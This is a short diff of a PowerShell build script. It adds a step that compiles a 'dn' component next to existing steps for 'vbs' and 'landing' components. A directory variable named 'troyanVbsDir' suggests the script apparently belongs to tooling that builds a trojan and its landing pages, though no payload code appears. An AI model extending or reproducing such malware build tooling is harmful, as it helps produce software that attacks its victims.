@@ -32,9 +32,12 @@ if ([string]::IsNullOrEmpty($server.rootDir)) {
 #vbs
 & (Join-Path -Path $server.troyanVbsDir -ChildPath "./vbscompile.ps1") -serverName $serverName
 
+#dn
+& (Join-Path -Path $scriptDir -ChildPath "./compile.dn.ps1") -serverName $serverName
+
+
 #landing
 & (Join-Path -Path $scriptDir -ChildPath "./compile.landing.ps1") -serverName $serverName
-
 
 
 if ($action -eq "apply")
